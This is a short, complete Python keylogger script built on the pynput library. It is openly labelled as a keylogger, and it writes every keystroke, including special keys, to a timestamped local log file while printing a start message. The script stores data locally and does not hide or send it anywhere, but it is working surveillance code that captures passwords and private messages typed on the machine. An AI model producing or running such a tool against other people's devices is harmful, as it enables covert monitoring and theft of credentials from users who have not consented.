from pynput import keyboard
import logging
from datetime import datetime

# Set up logging to a file
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # Start the listener in a non-blocking thread
    print(f"[*] Keylogger started. Logging to {log_filename}")
    listener.join()   # Wait for the listener thread to finish

start_keylogger()

